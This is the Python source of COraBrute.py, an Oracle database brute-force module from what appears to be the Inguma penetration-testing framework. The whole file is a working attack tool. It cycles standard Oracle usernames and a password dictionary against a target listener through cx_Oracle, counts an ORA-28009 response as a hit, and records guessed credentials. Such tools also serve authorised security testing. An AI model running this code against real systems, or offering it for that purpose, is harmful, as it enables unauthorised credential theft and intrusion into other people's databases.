#!/usr/bin/python

##      COraBrute.py
#       
#       Copyright 2010 Joxean Koret <joxeankoret@yahoo.es>
#       
#       This program is free software; you can redistribute it and/or modify
#       it under the terms of the GNU General Public License as published by
#       the Free Software Foundation; either version 2 of the License, or
#       (at your option) any later version.
#       
#       This program is distributed in the hope that it will be useful,
#       but WITHOUT ANY WARRANTY; without even the implied warranty of
#       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#       GNU General Public License for more details.
#       
#       You should have received a copy of the GNU General Public License
#       along with this program; if not, write to the Free Software
#       Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#       MA 02110-1301, USA.

import os
import sys
import time
import string

import cx_Oracle

from lib.module import CIngumaModule
from lib.liboracleexploit import STANDARD_USERS

name = "bruteora"
brief_description = "A simple Oracle brute force tool"
type = "brute"

globals = ["sid", ]

class COraBrute(CIngumaModule):

    exploitType = 3
    services = ""
    results = {}
    user = ""
    sid = ""
    allUsers = False
    connection = None

    def help(self):
        print "target = <Target ip or hostname>"
        print "port = <Target port>"
        print "sid = <sid>"
        print
        print "Optional:"
        print "user = <username>"
        print
        print "If you don't specify the username the most common users will be checked"
        print

    def bruteForce(self):
    
        times = 0

        if self.allUsers:
            userList = STANDARD_USERS
        else:
            userList = [self.user, ]

        self.open()

        self.gom.echo( "Brute forcing started" )
        self.gom.echo( "---------------------" )
        self.gom.echo( "" )

        try:
            sys.stdout.write("Trying " + self.user + "/" + self.user)
            self.login(self.user, self.user)
            self.addToDict(self.target + "_passwords", self.user + "/" + self.user)
            self.results[self.user] = self.user
            return True
        except:
            # Well, first try :)
            pass

        for user in userList:
            for passwd in self.getPasswordList():
                time.sleep(self.waitTime)
                try:
                    passwd = passwd.replace("\n", "").replace("\r", "")
                    self.gom.echo( "Trying " + user + "/" + passwd + "..." )
                    self.login(user, passwd)
                    sys.stdout.write("\b"  * 80)
                    self.addToDict(self.target + "_passwords", user + "/" + passwd)
                    self.results[user] = passwd
                    self.gom.echo( "" )
                    self.gom.echo( "[+] Guessed " + user + "/" + passwd )

                    if not self.allUsers:
                        return True
                    else:
                        break

                except KeyboardInterrupt:
                    self.gom.echo( "Aborted." )
                    return False
                except:
                    x = str(sys.exc_info()[1])

                    if x.lower().find("tns:") > -1:
                        times += 1
                        
                        if times > 3:
                            self.gom.echo( "" )
                            raise
                    elif x.lower().find("ora-28009") > -1:
                        times = 0
                        self.addToDict(self.target + "_passwords", user + "/" + passwd)
                        self.results[user] = passwd
                        self.gom.echo( "" )
                        self.gom.echo( "[+] Guessed " + user + "/" + passwd )

                        if not self.allUsers:
                            return True
                        else:
                            break

                    times = 0

        return False

    def getPasswordList(self):
        fname = self.dict["base_path"]
        if fname != "" :
            fname += os.sep + "data" + os.sep + "dict"
        else:
            fname = "data" + os.sep + "dict"

        f = file(fname, "r")
        return f.readlines()

    def open(self):
        pass

    def login(self, user, thepassword):
        link    = "%s/%s@(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(HOST=%s)(PORT=%d)))"
        link += "(CONNECT_DATA=(SERVICE_NAME=%s)))"
        link    = link % (user, thepassword, self.target, int(self.port), self.sid)

        self.connection = cx_Oracle.connect(link)
        self.close()

    def close(self):
        pass

    def run(self):
        if self.target == "":
            self.gom.echo( "No target specified" )
            return False
        
        if self.user == "":
            self.gom.echo( "[+] No user specified, trying ALL posible users" )
            self.allUsers = True

        if self.port == 0 or self.port == "":
            self.port = 1521
        
        if self.sid == "" or self.sid is None:
            self.gom.echo( "[+] Warning! No SID specified, using ORCL" )
            self.sid = "ORCL"

        self.bruteForce()
        return True

    def printSummary(self):
        self.gom.echo( "" )
        for x in self.results:
            self.gom.echo( "[+] User guessed: " + x + "/" + self.results[x] )
